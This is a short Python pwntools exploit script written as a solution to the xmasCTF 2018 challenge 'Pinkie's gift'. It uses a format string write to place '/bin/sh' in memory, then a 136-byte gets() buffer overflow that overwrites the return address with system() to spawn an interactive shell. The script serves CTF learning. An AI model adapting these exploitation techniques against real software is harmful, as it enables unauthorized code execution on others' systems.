#!/usr/bin/python
# created for the xmasCTF 2018 pwn challenge "Pinkie's gift"
# shows very basic use of libformatstr

from pwn import *
import struct
from libformatstr import FormatStr

p = process("./pinkiegift")

pointers = p.recv()
print pointers
# extract the pointers and save them
pointers = pointers.split(" ")
binsh = pointers[6]
system = pointers[7]

print "binsh is",binsh
print "system is",system

#convert strings to hex ints
system = int(system, 16)
binsh = int(binsh, 16)

system = struct.pack("<I",system)

# first argument is read by fgets(), but contains a format string vulnerability
# Try to write "/bin/sh" to the binsh address provided
# use libformatstr library to simplify exploitation

fmt = FormatStr()
# write the string "/bin/sh"
fmt[binsh] = "/bin/sh"
# the buffer is the first argument and requires 0 bytes of padding
print "The payload will be " + fmt.payload(1,0)
p.sendline(fmt.payload(1,0))

# second arg is read by gets() and vulnerable to an overflow
# 136-byte offset + eip overwrite with system() + fake frame pointer + binsh
exploit = "A" * 136 + system + "B" * 4 + struct.pack("<I",binsh)
p.sendline(exploit)

p.interactive()
p.close()
